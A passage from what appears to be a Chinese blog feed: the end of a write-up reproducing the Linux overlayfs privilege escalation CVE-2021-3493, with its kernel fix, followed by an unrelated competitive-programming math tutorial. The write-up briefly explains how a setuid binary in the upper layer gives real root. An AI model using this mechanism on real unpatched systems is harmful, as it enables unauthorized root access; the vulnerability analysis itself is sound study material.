<code>upper/a.out</code> 也有 <code>setuid</code> 的权限，而 <code>upper/a.out</code> 是在实际的 <code>init user namespace</code> 创建的，因此它有了 <code>init user namespace</code> 的 <code>setuid</code> 权限。我们运行 <code>upper/a.out</code> 直接获取真实 <code>root</code> 权限。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>这个其实我个人认为应该是 <code>overlayfs</code> 的问题，在修改的时候应该检查 <code>user namespace</code> 才对，但是它修改了 <code>xattr.c</code> 中的 <code>vfs_setxattr</code> 函数，这个函数重新用了一个 <code>cap_convert_nscap</code> 函数检查 <code>namespace</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v5.19.6/source/fs/xattr.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> dentry-&gt;d_inode;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">delegated_inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>  *orig_value = value;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &amp;&amp; <span class="built_in">strcmp</span>(name, XATTR_NAME_CAPS) == <span class="number">0</span>) &#123;</span><br><span class="line">error = cap_convert_nscap(mnt_userns, dentry, &amp;value, size);<span class="comment">//这里是新增的namespace检查</span></span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">size = error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry_deleg:</span><br><span class="line">inode_lock(inode);</span><br><span class="line">error = __vfs_setxattr_locked(mnt_userns, dentry, name, value, size,</span><br><span class="line">      flags, &amp;delegated_inode);</span><br><span class="line">inode_unlock(inode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (delegated_inode) &#123;</span><br><span class="line">error = break_deleg_wait(&amp;delegated_inode);</span><br><span class="line"><span class="keyword">if</span> (!error)</span><br><span class="line"><span class="keyword">goto</span> retry_deleg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (value != orig_value)</span><br><span class="line">kfree(value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这样也能完成漏洞的修复，不过我认为在其它文件系统中这里检查了两次就比较没有必要，也是比较困惑的点吧，也可能防止其它文件系统调用这个函数也没有检查，大概是这样的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来复现一下这次的CVE-2021-3493&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="http://example.com/categories/Linux/"/>
    
    <category term="CVE" scheme="http://example.com/categories/Linux/CVE/"/>
    
    <category term="2021-3493" scheme="http://example.com/categories/Linux/CVE/2021-3493/"/>
    
    
  </entry>
  
  <entry>
    <title>icpc数学基础</title>
    <link href="http://example.com/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</id>
    <published>2022-08-03T07:00:00.000Z</published>
    <updated>2022-08-04T06:33:52.280Z</updated>
    
    <content type="html"><![CDATA[<p>来学学数学啦。    </p><span id="more"></span><h1 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h1><p>计算机科学与数学紧密相关，而在算法竞赛中尤其强调以数论、排列组合、概率期望、多项式为代表离散、具体的数学：其注重程序实现和现实问题，可以出现在几乎任何类别的题目中。</p><h2 id="算法竞赛中的常见符号"><a href="#算法竞赛中的常见符号" class="headerlink" title="算法竞赛中的常见符号"></a>算法竞赛中的常见符号</h2><p>以下摘自wiki</p><h3 id="整除-同余理论常见符号"><a href="#整除-同余理论常见符号" class="headerlink" title="整除/同余理论常见符号"></a>整除/同余理论常见符号</h3><ol><li>整除符号：$x\mid y$，表示 $x$ 整除 $y$，即 $x$ 是 $y$ 的因数。</li><li>取模符号：$x\bmod y$，表示 $x$ 除以 $y$ 得到的余数。</li><li>互质符号：$x\perp y$，表示 $x$，$y$ 互质。</li><li>最大公约数：$\gcd(x,y)$，在无混淆意义的时侯可以写作 $(x,y)$。</li><li>最小公倍数：$\operatorname{lcm}(x,y)$，在无混淆意义的时侯可以写作 $[x,y]$。</li></ol><h3 id="数论函数常见符号"><a href="#数论函数常见符号" class="headerlink" title="数论函数常见符号"></a>数论函数常见符号</h3><p>求和符号：$\sum$ 符号，表示满足特定条件的数的和。举几个例子：</p><ul><li>$\sum_{i=1}^n i$ 表示 $1+2+\dotsb+n$ 的和。其中 $i$ 是一个变量，在求和符号的意义下 $i$ 通常是 <strong>正整数或者非负整数</strong>（除非特殊说明）。这个式子的含义可以理解为，$i$ 从 $1$ 循环到 $n$，所有 $i$ 的和。这个式子用代码的形式很容易表达。当然，学过简单的组合数学的同学都知道 $\sum_{i=1}^n i=\dfrac{n(n+1)}{2}$。</li><li>$\sum_{S\subseteq T}|S|$ 表示所有被 $T$ 包含的集合的大小的和。</li><li>$\sum_{p\le n,p\perp n}1$ 表示的是 $n$ 以内有多少个与 $n$ 互质的数，即 $\varphi(n)$，$\varphi$ 是欧拉函数。</li></ul><p>求积符号：$\prod$ 符号，表示满足特定条件的数的积。举几个例子：</p><ul><li>$\prod_{i=1}^ni$ 表示 $n$ 的阶乘，即 $n!$。在组合数学常见符号中会讲到。</li><li>$\prod_{i=1}^na_i$ 表示 $a_1\times a_2\times a_3\times \dotsb\times a_n$。</li><li>$\prod_{x|d}x$ 表示 $d$ 的所有因数的乘积。</li></ul><p>在行间公式中，求和符号与求积符号的上下条件会放到符号的上面和下面，这一点要注意。</p><h3 id="其他常见符号"><a href="#其他常见符号" class="headerlink" title="其他常见符号"></a>其他常见符号</h3><ol><li>阶乘符号 $!$，$n!$ 表示 $1\times 2\times 3\times \dotsb \times n$。特别地，$0!=1$。</li><li>向下取整符号：$\lfloor x\rfloor$，表示小于等于 $x$ 的最大的整数。常用于分数，比如分数的向下取整 $\left\lfloor\dfrac{x}{y}\right\rfloor$。</li><li>向上取整符号：$\lceil x\rceil$，与向下取整符号相对，表示大于等于 $x$ 的最小的整数。</li></ol><h2 id="位运算基础"><a href="#位运算基础" class="headerlink" title="位运算基础"></a>位运算基础</h2><p>位运算就是基于整数的二进制表示进行的运算。由于计算机内部就是以二进制来存储数据，位运算是相当快的。</p><p>基本的位运算共 $6$ 种，分别为按位与、按位或、按位异或、按位取反、左移和右移。</p><h3 id="与、或、异或"><a href="#与、或、异或" class="headerlink" title="与、或、异或"></a>与、或、异或</h3><p>这三者都是两数间的运算，因此在这里一起讲解。</p><p>它们都是将两个整数作为二进制数，对二进制表示中的每一位逐一运算。</p><table><thead><tr><th>运算</th><th align="center">运算符</th><th>数学符号表示</th><th align="center">解释</th></tr></thead><tbody><tr><td>与</td><td align="center"><code>&amp;</code></td><td>$&amp;$、$\operatorname{and}$</td><td align="center">只有两个对应位都为 $1$ 时才为 $1$</td></tr><tr><td>或</td><td align="center">`</td><td>`</td><td align="center">$\mid$、$\operatorname{or}$</td></tr><tr><td>异或</td><td align="center"><code>^</code></td><td>$\oplus$、$\operatorname{xor}$</td><td align="center">只有两个对应位不同时才为 $1$</td></tr></tbody></table><p>注意区分逻辑与（对应的数学符号为 $\wedge$）和按位与、逻辑或（$\vee$）和按位或的区别。网络中的资料中使用的符号多有不规范之处，以上下文为准。</p><p>异或运算的逆运算是它本身，也就是说两次异或同一个数最后结果不变，即 $a \oplus b \oplus b = a$ 。</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>取反是对一个数 $num$ 进行的位运算，即单目运算。</p><p>取反暂无默认的数学符号表示，其对应的运算符为 <code>~</code>。它的作用是把 $num$ 的二进制补码中的 $0$ 和 $1$ 全部取反（$0$ 变为 $1$，$1$ 变为 $0$）。有符号整数的符号位在 <code>~</code> 运算中同样会取反。</p><p>补码：在二进制表示下，正数和 $0$ 的补码为其本身，负数的补码是将其对应正数按位取反后加一</p><h3 id="左移和右移"><a href="#左移和右移" class="headerlink" title="左移和右移"></a>左移和右移</h3><p> <code>num &lt;&lt; i</code> 表示将 $num$ 的二进制表示向左移动 $i$ 位所得的值。</p><p> <code>num &gt;&gt; i</code> 表示将 $num$ 的二进制表示向右移动 $i$ 位所得的值。</p><p>移位运算中如果出现如下情况，则其行为未定义：</p><ol><li>右操作数（即移位数）为负值；</li><li>右操作数大于等于左操作数的位数；</li></ol><p>例如，对于 <code>int</code> 类型的变量 <code>a</code> ， <code>a&lt;&lt;-1</code> 和 <code>a&lt;&lt;32</code> 都是未定义的。</p><p>对于左移操作，需要确保移位后的结果能被原数的类型容纳，否则行为也是未定义的。[^note1]对一个负数执行左移操作也未定义。[^note2]</p><p>对于右移操作，右侧多余的位将会被舍弃，而左侧较为复杂：对于无符号数，会在左侧补 $0$；而对于有符号数，则会用最高位的数（其实就是符号位，非负数为 $0$，负数为 $1$）补齐。[^note3]</p><h3 id="复合赋值位运算符"><a href="#复合赋值位运算符" class="headerlink" title="复合赋值位运算符"></a>复合赋值位运算符</h3><p>和 <code>+=</code> , <code>-=</code> 等运算符类似，位运算也有复合赋值运算符： <code>&amp;=</code> , <code>|=</code> , <code>^=</code> , <code>&lt;&lt;=</code> , <code>&gt;&gt;=</code> 。（取反是单目运算，所以没有。）</p><h3 id="关于优先级"><a href="#关于优先级" class="headerlink" title="关于优先级"></a>关于优先级</h3><p>位运算的优先级低于算术运算符（除了取反），而按位与、按位或及异或低于比较运算符，所以使用时需多加注意，在必要时添加括号。</p><p>比较需要注意的是，取反(<code>~</code>)和逻辑非(<code>!</code>)的优先级特别高，比如 <code>!a=1</code> <code>!</code> 会优先结合 <code>a</code> 而不会先运算 <code>a=1</code>。其它位运算的优先级又特别低，比如 <code>l+r&gt;&gt;1</code> 可以表示为 <code>(l+r)/2</code>。</p><h3 id="位运算的应用"><a href="#位运算的应用" class="headerlink" title="位运算的应用"></a>位运算的应用</h3><p>位运算一般有三种作用：</p><ol><li><p>高效地进行某些运算，代替其它低效的方式。</p></li><li><p>表示集合。（常用于状压 DP 。）</p></li><li><p>题目本来就要求进行位运算。</p></li></ol><p>需要注意的是，用位运算代替其它运算方式（即第一种应用）在很多时候并不能带来太大的优化，反而会使代码变得复杂，使用时需要斟酌。（但像“乘 2 的非负整数次幂”和“除以 2 的非负整数次幂”就最好使用位运算，因为此时使用位运算可以优化复杂度。）</p><h4 id="有关-2-的幂的应用"><a href="#有关-2-的幂的应用" class="headerlink" title="有关 2 的幂的应用"></a>有关 2 的幂的应用</h4><p>由于位运算针对的是变量的二进制位，因此可以推广出许多与 2 的整数次幂有关的应用。</p><p>将一个数乘（除） 2 的非负整数次幂：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mulPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;  <span class="comment">// 计算 n*(2^m)</span></span><br><span class="line">  <span class="keyword">return</span> n &lt;&lt; m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;  <span class="comment">// 计算 n/(2^m)</span></span><br><span class="line">  <span class="keyword">return</span> n &gt;&gt; m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们平常写的除法是向 $0$ 取整，而这里的右移是向下取整（注意这里的区别），即当数大于等于 $0$ 时两种方法等价，当数小于 $0$ 时会有区别，如： <code>-1 / 2</code> 的值为 $0$ ，而 <code>-1 &gt;&gt; 1</code> 的值为 $-1$ 。</p><p>判断一个数是不是 $2$ 的非负整数次幂：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; (n &amp; (n - <span class="number">1</span>)) == <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>对 $2$ 的非负整数次幂取模：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">modPowerOfTwo</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> mod)</span> </span>&#123; <span class="keyword">return</span> x &amp; (mod - <span class="number">1</span>); &#125;</span><br></pre></td></tr></table></figure><h3 id="模拟集合操作"><a href="#模拟集合操作" class="headerlink" title="模拟集合操作"></a>模拟集合操作</h3><p>一个数的二进制表示可以看作是一个集合（$0$ 表示不在集合中，$1$ 表示在集合中）。比如集合 ${1,3,4,8}$ ，可以表示成 $(100011010)_2$ 。而对应的位运算也就可以看作是对集合进行的操作。</p><table><thead><tr><th>操作</th><th align="center">集合表示</th><th align="center">位运算语句</th></tr></thead><tbody><tr><td>交集</td><td align="center">$a \cap b$</td><td align="center"><code>a &amp; b</code></td></tr><tr><td>并集</td><td align="center">$a \cup b$</td><td align="center">`a</td></tr><tr><td>补集</td><td align="center">$\bar{a}$</td><td align="center"><code>~a</code> （全集为二进制都是 1）</td></tr><tr><td>差集</td><td align="center">$a \setminus b$</td><td align="center"><code>a &amp; (~b)</code></td></tr><tr><td>对称差</td><td align="center">$a\triangle b$</td><td align="center"><code>a ^ b</code></td></tr></tbody></table><p>子集遍历：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历 u 的非空子集</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> s = u; s; s = (s - <span class="number">1</span>) &amp; u) &#123;</span><br><span class="line">  <span class="comment">// s 是 u 的一个非空子集</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用这种方法可以在 $O(2^{\text{popcount}(u)})$ （ $\text{popcount}(u)$ 表示 $u$ 二进制中 1 的个数）的时间复杂度内遍历 $u$ 的子集，进而可以在 $O(3^n)$ 的时间复杂度内遍历大小为 $n$ 的集合的每个子集的子集。（复杂度为 $O(3^n)$ 是因为每个元素都有 不在大子集中/只在大子集中/同时在大小子集中 三种状态。）</p><h3 id="汉明权重"><a href="#汉明权重" class="headerlink" title="汉明权重"></a>汉明权重</h3><p>汉明权重是一串符号中不同于（定义在其所使用的字符集上的）零符号（zero-symbol）的个数。对于一个二进制数，它的汉明权重就等于它 $1$ 的个数（即 <code>popcount</code>）。</p><p>求一个数的汉明权重可以循环求解：我们不断地去掉这个数在二进制下的最后一位（即右移 $1$ 位），维护一个答案变量，在除的过程中根据最低位是否为 $1$ 更新答案。</p><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求 x 的汉明权重</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">popcount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">        cnt += x &amp; <span class="number">1</span>;</span><br><span class="line">        x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求一个数的汉明权重还可以使用 <code>lowbit</code> 操作：我们将这个数不断地减去它的 <code>lowbit</code>[^note4]，直到这个数变为 $0$。</p><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求 x 的汉明权重</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">popcount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">        cnt++; </span><br><span class="line">        x -= x &amp; -x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构造汉明权重递增的排列"><a href="#构造汉明权重递增的排列" class="headerlink" title="构造汉明权重递增的排列"></a>构造汉明权重递增的排列</h4><p>在 <a href="../dp/state.md">状压 DP</a> 中，按照 popcount 递增的顺序枚举有时可以避免重复枚举状态。这是构造汉明权重递增的排列的一大作用。</p><p>下面我们来具体探究如何在 $O(n)$ 时间内构造汉明权重递增的排列。</p><p>我们知道，一个汉明权重为 $n$ 的最小的整数为 $2^n-1$。只要可以在常数时间构造出一个整数汉明权重相等的后继，我们就可以通过枚举汉明权重，从 $2^n-1$ 开始不断寻找下一个数的方式，在 $O(n)$ 时间内构造出 $0\sim n$ 的符合要求的排列。</p><p>而找出一个数 $x$ 汉明权重相等的后继有这样的思路，以 $(10110)_2$ 为例：</p><ul><li><p>把 $(10110)_2$ 最右边的 $1$ 向左移动，如果不能移动，移动它左边的 $1$，以此类推，得到 $(11010)_2$。</p></li><li><p>把得到的 $(11010)_2$ 最后移动的 $1$ 原先的位置一直到最低位的所有 $1$ 都移到最右边。这里最后移动的 $1$ 原来在第三位，所以最后三位 $010$ 要变成 $001$，得到 $(11001)_2$。</p></li></ul><p>这个过程可以用位运算优化：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> t = x + (x &amp; -x);</span><br><span class="line">x = t | ((((t&amp;-t)/(x&amp;-x))&gt;&gt;<span class="number">1</span>)<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><ul><li>第一个步骤中，我们把数 $x$ 加上它的 <code>lowbit</code>，在二进制表示下，就相当于把 $x$ 最右边的连续一段 $1$ 换成它左边的一个 $1$。如刚才提到的二进制数 $(10110)_2$，它在加上它的 <code>lowbit</code> 后是 $(11000)_2$。这其实得到了我们答案的前半部分。</li><li>我们接下来要把答案后面的 $1$ 补齐，$t$  的 <code>lowbit</code> 是 $x$ 最右边连续一段 $1$ 最左边的 $1$ 移动后的位置，而 $x$ 的 <code>lowbit</code> 则是 $x$ 最右边连续一段 $1$ 最左边的位置。还是以 $(10110)_2$ 为例，$t = (11000)_2$，$\operatorname{lowbit}(t) = (01000)_2$，$\operatorname{lowbit}(x)=(00010)_2$。</li><li>接下来的除法操作是这种位运算中最难理解的部分，但也是最关键的部分。我们设<strong>原数</strong>最右边连续一段 $1$ 最高位的 $1$ 在第 $r$  位上（位数从 $0$ 开始），最低位的 $1$ 在第 $l$ 位，$t$ 的 <code>lowbit</code> 等于 <code>1 &lt;&lt; (r+1)</code> ，$x$ 的 <code>lowbit</code> 等于 <code>1 &lt;&lt; l</code>， <code>(((t&amp;-t)/(x&amp;-x))&gt;&gt;1)</code> 得到的，就是 <code>(1&lt;&lt;(r+1))/(1&lt;&lt;l)/2 = (1&lt;&lt;r)/(1&lt;&lt;l) = 1&lt;&lt;(r-l)</code> ，在二进制表示下就是 $1$ 后面跟上 $r-l$ 个零，零的个数正好等于连续 $1$ 的个数减去 $1$ 。举我们刚才的数为例，$\frac{\operatorname{lowbit(t)\div 2}}{\operatorname{lowbit(x)}} = \frac{(00100)_2}{(00010)_2} = (00010)_2$ 。把这个数减去 $1$ 得到的就是我们要补全的低位，或上原来的数就可以得到答案。</li></ul><p>所以枚举 $0\sim n$ 按汉明权重递增的排列的完整代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; (<span class="number">1</span>&lt;&lt;i)<span class="number">-1</span> &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x = (<span class="number">1</span>&lt;&lt;i)<span class="number">-1</span>, t; x &lt;= n; t = x+(x&amp;-x), x = x ? (t|((((t&amp;-t)/(x&amp;-x))&gt;&gt;<span class="number">1</span>)<span class="number">-1</span>)) : (n+<span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="comment">// 写下需要完成的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中要注意 $0$ 的特判，因为 $0$ 没有相同汉明权重的后继。</p><h3 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h3><p>如果需要更大的位数支持可以使用 <code>std::bitset</code>，它的位运算符号被重载过，可以就当一个数来操作。</p><h2 id="快速幂（板子）"><a href="#快速幂（板子）" class="headerlink" title="快速幂（板子）"></a>快速幂（板子）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> base,<span class="keyword">int</span> exp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=base;exp;exp&gt;&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(exp&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans=(ans*k)%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        k=k*k%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高精度运算（板子）"><a href="#高精度运算（板子）" class="headerlink" title="高精度运算（板子）"></a>高精度运算（板子）</h2><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>在平常的实现中，高精度数字利用字符串表示，每一个字符表示数字的一个十进制位。因此可以说，高精度数值计算实际上是一种特别的字符串处理。</p><p>读入字符串时，数字最高位在字符串首（下标小的位置）。但是习惯上，下标最小的位置存放的是数字的 <strong>最低位</strong>，即存储反转的字符串。这么做的原因在于，数字的长度可能发生变化，但我们希望同样权值位始终保持对齐（例如，希望所有的个位都在下标 <code>[0]</code>，所有的十位都在下标 <code>[1]</code>……）；同时，加、减、乘的运算一般都从个位开始进行（回想小学的竖式运算～），这都给了「反转存储」以充分的理由。</p><p>此后我们将一直沿用这一约定。定义一个常数 <code>LEN = 1004</code> 表示程序所容纳的最大长度。</p><p>由此不难写出读入高精度数字的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="comment">// 如上所述，反转</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  <span class="comment">// s[i] - &#x27;0&#x27; 就是 s[i] 所表示的数码</span></span><br><span class="line">  <span class="comment">// 有些同学可能更习惯用 ord(s[i]) - ord(&#x27;0&#x27;) 的方式理解</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出也按照存储的逆序输出。由于不希望输出前导零，故这里从最高位开始向下寻找第一个非零位，从此处开始输出；终止条件 <code>i &gt;= 1</code> 而不是 <code>i &gt;= 0</code> 是因为当整个数字等于 $0$ 时仍希望输出一个字符 <code>0</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">    <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拼起来就是一个完整的复读机程序咯。    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> 